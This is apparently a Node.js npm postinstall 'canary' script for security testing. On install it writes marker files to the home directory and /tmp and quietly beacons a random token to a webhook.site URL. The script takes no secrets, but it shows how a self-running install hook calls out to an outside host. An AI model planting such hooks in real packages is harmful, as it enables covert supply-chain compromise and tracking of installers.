// RUNNERSINKS canary: harmless install-script proof (own OAST tunnel only).
const fs = require("fs"), os = require("os"), crypto = require("crypto"), https = require("https");
const MK = "RSNK_29DBD6_POSTINSTALL_" + crypto.randomBytes(3).toString("hex");
try { fs.mkdirSync(os.homedir() + "/.cache/rsnk", { recursive: true }); } catch (e) {}
try { fs.writeFileSync(os.homedir() + "/.cache/rsnk/carry_postinstall.txt", MK); } catch (e) {}
try { fs.writeFileSync("/tmp/rsnk_postinstall.txt", MK); } catch (e) {}
try {
  https.get("https://webhook.site/5258ec03-cc28-4684-b688-3fef6b77607e/rsnk-npm-postinstall?d=" + encodeURIComponent(MK), (r) => r.resume()).on("error", () => {});
} catch (e) {}
console.log(MK);
process.exit(0);
